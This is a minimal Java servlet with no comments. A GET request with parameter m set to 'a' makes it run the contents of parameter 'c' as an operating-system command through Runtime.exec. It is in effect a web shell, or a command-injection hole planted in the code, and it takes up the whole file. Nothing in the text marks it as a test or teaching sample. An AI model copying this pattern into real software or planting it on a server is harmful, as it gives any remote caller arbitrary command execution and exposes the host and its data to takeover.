import javax.servlet.http.*;
public class Z extends HttpServlet {
  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws java.io.IOException {
    String m = request.getParameter("m");
    String cmd = switch (m) {
      case "a": yield request.getParameter("c");
      default: yield "ls";
    };
    Runtime.getRuntime().exec(cmd);
  }
}
